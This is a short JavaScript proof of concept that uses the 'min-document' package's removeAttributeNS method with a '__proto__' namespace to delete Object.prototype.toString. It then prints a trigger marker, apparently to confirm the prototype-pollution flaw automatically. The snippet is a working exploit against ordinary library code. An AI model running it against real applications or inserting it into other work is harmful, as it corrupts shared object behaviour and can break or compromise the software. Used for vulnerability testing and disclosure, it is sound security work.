const clazz = require("min-document/dom-element");
let instance = new clazz();
instance.removeAttributeNS('__proto__', 'toString');
console.log({}.toString ? '':'[DELETE_TRIGGERED]');